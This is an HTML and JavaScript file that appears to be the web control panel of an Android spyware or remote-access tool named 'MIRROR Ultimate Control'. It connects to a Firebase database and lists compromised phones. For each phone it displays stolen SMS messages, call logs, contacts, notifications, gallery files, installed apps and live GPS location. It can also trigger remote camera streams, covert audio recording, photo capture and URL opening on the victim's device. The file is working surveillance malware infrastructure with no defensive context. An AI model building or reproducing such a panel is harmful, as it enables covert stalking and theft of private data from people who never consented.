<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MIRROR Ultimate Control</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        :root {
            --sidebar-bg: #0F172A;
            --main-bg: #F8FAFC;
            --primary: #2563EB;
            --danger: #DC2626;
            --success: #16A34A;
            --warning: #F59E0B;
            --border: #E2E8F0;
        }
        body { margin: 0; font-family: 'Inter', sans-serif; display: flex; height: 100vh; background-color: var(--main-bg); overflow: hidden; }
        .sidebar { width: 280px; background-color: var(--sidebar-bg); color: #CBD5E1; display: flex; flex-direction: column; flex-shrink: 0; }
        .sidebar-header { padding: 24px; border-bottom: 1px solid #1E293B; }
        #device-selector { width: 100%; padding: 12px; background: #1E293B; color: white; border: 1px solid #334155; border-radius: 8px; margin-top: 12px; cursor: pointer; }

        .nav-group { padding: 10px 0; }
        .nav-item { padding: 12px 24px; display: flex; align-items: center; cursor: pointer; transition: 0.2s; font-size: 0.95rem; }
        .nav-item i { width: 24px; margin-right: 14px; font-size: 1.1rem; }
        .nav-item:hover, .nav-item.active { background: #1E293B; color: white; }
        .nav-item.active i { color: var(--primary); }

        .main-content { flex-grow: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; }
        .content-page { display: none; }
        .content-page.active { display: block; }

        .card { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); margin-bottom: 24px; border: 1px solid var(--border); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }

        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
        .tool-card { background: white; padding: 20px; border-radius: 12px; border: 1px solid var(--border); text-align: center; cursor: pointer; transition: 0.3s; position: relative; }
        .tool-card:hover { transform: translateY(-5px); box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
        .tool-card i { font-size: 2rem; color: var(--primary); margin-bottom: 15px; display: block; }
        .tool-card h4 { margin: 0; color: #1E293B; }
        .tool-card.active { border: 2px solid var(--danger); background: #FEF2F2; }

        .indicator { position: absolute; top: 10px; right: 10px; width: 10px; height: 10px; border-radius: 50%; display: none; }
        .tool-card.active .indicator { display: block; background: var(--danger); animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-danger { background: var(--danger); color: white; }

        #stream-img, #photo-img { width: 100%; max-width: 600px; border-radius: 12px; background: #000; border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        .status-badge { padding: 6px 14px; border-radius: 99px; font-size: 0.8rem; font-weight: 700; display: flex; align-items: center; gap: 6px; }
        .online { background: #DCFCE7; color: #166534; }
        .offline { background: #FEE2E2; color: #991B1B; }

        #map { height: 500px; border-radius: 16px; border: 1px solid var(--border); z-index: 1; }

        .list-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        .list-table th, .list-table td { padding: 12px; border-bottom: 1px solid #EDF2F7; text-align: left; }
        .list-table th { background: #F8FAFC; font-weight: 600; color: #64748B; }

        .notif-item { padding: 15px; border-bottom: 1px solid var(--border); border-left: 4px solid var(--primary); background: white; margin-bottom: 10px; border-radius: 0 8px 8px 0; }
        .notif-pkg { color: #64748B; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; }
        .notif-title { color: #1E293B; font-weight: 700; margin: 4px 0; }
        .notif-text { color: #475569; font-size: 0.95rem; }
        .notif-time { color: #94A3B8; font-size: 0.75rem; margin-top: 8px; display: block; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">
            <h2 style="font-size: 1.4rem; margin:0; color:white;">MIRROR CONTROL</h2>
            <select id="device-selector"><option value="">Scanning...</option></select>
        </div>

        <div class="nav-group">
            <div class="nav-item active" onclick="showPage('dashboard')"><i class="fas fa-video"></i> Live Stream</div>
            <div class="nav-item" onclick="showPage('notifications')"><i class="fas fa-bell"></i> Live Notifications</div>
            <div class="nav-item" onclick="showPage('remote')"><i class="fas fa-tools"></i> Remote Tools</div>
            <div class="nav-item" onclick="showPage('photos')"><i class="fas fa-camera-retro"></i> Captured Photo</div>
            <div class="nav-item" onclick="showPage('messages')"><i class="fas fa-envelope"></i> Messages</div>
            <div class="nav-item" onclick="showPage('calls')"><i class="fas fa-phone-alt"></i> Call History</div>
            <div class="nav-item" onclick="showPage('contacts')"><i class="fas fa-address-book"></i> Contacts</div>
            <div class="nav-item" onclick="showPage('locations')"><i class="fas fa-map-marked-alt"></i> GPS Tracker</div>
            <div class="nav-item" onclick="showPage('gallery')"><i class="fas fa-images"></i> Gallery Explorer</div>
            <div class="nav-item" onclick="showPage('apps')"><i class="fas fa-th-large"></i> App List</div>
        </div>
    </div>

    <div class="main-content">
        <div class="header-bar">
            <div>
                <h1 id="dev-name" style="margin:0; font-size: 1.8rem; color: #0F172A;">Select a Device</h1>
                <div id="health-bar" style="font-size: 0.95rem; color: #64748B; margin-top: 8px;"></div>
            </div>
            <div id="status-tag" class="status-badge offline">OFFLINE</div>
        </div>

        <div id="page-dashboard" class="content-page active">
            <div class="card">
                <div class="header-bar"><h3>Live Stream</h3>
                    <div style="display:flex; gap:10px;">
                        <button class="btn btn-primary" onclick="toggleStream('back')">Back Cam</button>
                        <button class="btn btn-primary" onclick="toggleStream('front')">Front Cam</button>
                        <button class="btn btn-danger" onclick="stopStream()">Stop Feed</button>
                    </div>
                </div>
                <center><img id="stream-img" src="" alt="Live Stream" onerror="this.src='https://via.placeholder.com/640x360?text=Camera+Feed+Offline'"></center>
            </div>
        </div>

        <div id="page-notifications" class="content-page">
            <div class="card">
                <div class="header-bar">
                    <h3>Live Notifications</h3>
                    <button class="btn btn-danger" onclick="clearNotifications()">Clear All</button>
                </div>
                <div id="notification-list"></div>
            </div>
        </div>

        <div id="page-photos" class="content-page">
            <div class="card">
                <h3>Last Captured Photo</h3>
                <center><img id="photo-img" src="" alt="No Photo Yet" style="background:#2D3748;"></center>
                <div style="text-align:center; margin-top:20px;">
                    <button class="btn btn-primary" onclick="sendCommand('takePhoto', true)" style="display:inline-flex;">Take New Photo</button>
                </div>
            </div>
        </div>

        <div id="page-remote" class="content-page">
            <div class="card">
                <h3>Remote Command Center</h3>
                <div class="tools-grid">
                    <div class="tool-card" onclick="sendCommand('takePhoto', true)"><i class="fas fa-camera"></i><h4>Capture Photo</h4></div>
                    <div class="tool-card" id="card-audio" onclick="toggleMic()"><div class="indicator"></div><i class="fas fa-microphone"></i><h4>Listen Audio</h4></div>
                    <div class="tool-card" id="card-flash" onclick="toggleFlash()"><i class="fas fa-bolt"></i><h4>Flashlight</h4></div>
                    <div class="tool-card" onclick="sendCommand('vibrate', true)"><i class="fas fa-mobile-alt"></i><h4>Vibrate</h4></div>
                    <div class="tool-card" onclick="sendCommand('ring', true)"><i class="fas fa-bell"></i><h4>Ring Device</h4></div>
                    <div class="tool-card" onclick="sendToast()"><i class="fas fa-comment-dots"></i><h4>Send Toast</h4></div>
                    <div class="tool-card" onclick="openUrl()"><i class="fas fa-external-link-alt"></i><h4>Open URL</h4></div>
                    <div class="tool-card" onclick="syncAll()"><i class="fas fa-sync"></i><h4>Sync All Data</h4></div>
                </div>
            </div>
        </div>

        <div id="page-messages" class="content-page"><div class="card"><h3>SMS Logs</h3><div id="sms-list"></div></div></div>
        <div id="page-calls" class="content-page"><div class="card"><h3>Call History</h3><div id="call-list"></div></div></div>
        <div id="page-contacts" class="content-page"><div class="card"><h3>Contacts</h3><div id="contact-list"></div></div></div>
        <div id="page-locations" class="content-page"><div class="card"><h3>Live Map</h3><div id="map"></div></div></div>
        <div id="page-gallery" class="content-page"><div class="card"><h3>Gallery Explorer</h3><div id="gallery-list"></div></div></div>
        <div id="page-apps" class="content-page"><div class="card"><h3>Application List</h3><div id="app-list"></div></div></div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://test-web2-57cbb-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentId = "";
        let map, marker;

        db.ref('devices').on('value', s => {
            const sel = document.getElementById('device-selector');
            const devices = s.val() || {};
            const prev = sel.value;
            sel.innerHTML = '<option value="">Select Device...</option>';
            for(let id in devices) {
                const model = devices[id].info?.model || id;
                const opt = document.createElement('option');
                opt.value = id; opt.innerText = model + (devices[id].health?.online ? " (Online)" : " (Offline)");
                sel.appendChild(opt);
            }
            if(prev) sel.value = prev;
        });

        document.getElementById('device-selector').onchange = (e) => {
            if(currentId) stopAllListeners();
            currentId = e.target.value;
            if(currentId) loadDevice(currentId);
        };

        function stopAllListeners() {
            const nodes = ['info','health','stream','lastPhoto','sms','callLogs','contacts','location','status','flashlight','gallery','installedApps','notifications'];
            nodes.forEach(n => db.ref(`devices/${currentId}/${n}`).off());
        }

        function loadDevice(id) {
            const ref = db.ref(`devices/${id}`);
            ref.child('info').on('value', s => document.getElementById('dev-name').innerText = s.val()?.model || "Device");
            ref.child('health').on('value', s => {
                const h = s.val() || {};
                const tag = document.getElementById('status-tag');
                tag.innerText = h.online ? 'ONLINE' : 'OFFLINE';
                tag.className = `status-badge ${h.online ? 'online' : 'offline'}`;
                document.getElementById('health-bar').innerHTML = `<i class="fas fa-battery-three-quarters"></i> ${h.battery}% | <i class="fas fa-hdd"></i> ${h.storage || '--'}`;
            });

            ref.child('stream').on('value', s => { if(s.val() && currentId === id) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val(); });
            ref.child('lastPhoto').on('value', s => { if(s.val() && currentId === id) document.getElementById('photo-img').src = 'data:image/jpeg;base64,' + s.val(); });

            ref.child('notifications').on('value', s => {
                let html = '';
                const data = s.val() || {};
                Object.values(data).reverse().forEach(v => {
                    const time = new Date(v.time).toLocaleTimeString();
                    html += `
                        <div class="notif-item">
                            <div class="notif-pkg">${v.package}</div>
                            <div class="notif-title">${v.title}</div>
                            <div class="notif-text">${v.text}</div>
                            <span class="notif-time">${time}</span>
                        </div>
                    `;
                });
                document.getElementById('notification-list').innerHTML = html || '<p style="color:#64748B; text-align:center;">No notifications yet.</p>';
            });

            ref.child('sms').on('value', s => {
                let html = '<table class="list-table"><tr><th>Type</th><th>Address</th><th>Body</th></tr>';
                const data = s.val() || {};
                Object.values(data).reverse().forEach(v => { html += `<tr><td>${v.type}</td><td>${v.address}</td><td>${v.body}</td></tr>`; });
                document.getElementById('sms-list').innerHTML = html + '</table>';
            });

            ref.child('callLogs').on('value', s => {
                let html = '<table class="list-table"><tr><th>Type</th><th>Number</th><th>Date</th></tr>';
                const data = s.val() || [];
                data.forEach(v => { html += `<tr><td>${v.type}</td><td>${v.number}</td><td>${v.date}</td></tr>`; });
                document.getElementById('call-list').innerHTML = html + '</table>';
            });

            ref.child('contacts').on('value', s => {
                let html = '<table class="list-table"><tr><th>Name</th><th>Number</th></tr>';
                const data = s.val() || [];
                data.forEach(v => { html += `<tr><td>${v.name}</td><td>${v.number}</td></tr>`; });
                document.getElementById('contact-list').innerHTML = html + '</table>';
            });

            ref.child('gallery').on('value', s => {
                let html = '<table class="list-table"><tr><th>File Name</th><th>Size</th></tr>';
                const data = s.val() || [];
                data.forEach(v => { html += `<tr><td>${v.name}</td><td>${v.size}</td></tr>`; });
                document.getElementById('gallery-list').innerHTML = html + '</table>';
            });

            ref.child('installedApps').on('value', s => {
                let html = '<table class="list-table"><tr><th>App Name</th><th>Package</th></tr>';
                const data = s.val() || {};
                for(let pkg in data) { html += `<tr><td>${data[pkg]}</td><td>${pkg.replace(/_/g,'.')}</td></tr>`; }
                document.getElementById('app-list').innerHTML = html + '</table>';
            });

            ref.child('status').on('value', s => {
                const card = document.getElementById('card-audio');
                if(s.val() === "Recording...") card.classList.add('active'); else card.classList.remove('active');
            });

            ref.child('location').on('value', s => {
                const l = s.val(); if(!l || currentId !== id) return;
                const p = [l.lat, l.lng];
                if(!map) { map = L.map('map').setView(p, 15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }
                if(marker) map.removeLayer(marker);
                marker = L.marker(p).addTo(map);
            });
        }

        function showPage(id) {
            document.querySelectorAll('.content-page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            document.getElementById(`page-${id}`).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        function sendCommand(cmd, val) { if(currentId) db.ref(`devices/${currentId}/commands/${cmd}`).set(val); }
        function clearNotifications() { if(currentId && confirm("Clear all notifications?")) db.ref(`devices/${currentId}/notifications`).remove(); }
        function toggleStream(t) { if(currentId) db.ref(`devices/${currentId}/streamConfig`).set({enabled: true, type: t}); }
        function stopStream() { if(currentId) db.ref(`devices/${currentId}/streamConfig/enabled`).set(false); }
        function toggleMic() { db.ref(`devices/${currentId}/status`).once('value', s => { db.ref(`devices/${currentId}/commands/recordSurround`).set(s.val() !== "Recording..."); }); }
        function toggleFlash() { db.ref(`devices/${currentId}/flashlight`).once('value', s => { db.ref(`devices/${currentId}/commands/flashlight`).set(!s.val()); }); }
        function syncAll() { ['getApps','getCallLogs','getSMS','getGallery','getContacts'].forEach(c => sendCommand(c, true)); }
        function sendToast() { const m = prompt("Message:"); if(m) sendCommand('toast', m); }
        function openUrl() { const u = prompt("URL:"); if(u) sendCommand('openUrl', u); }
    </script>
</body>
</html>
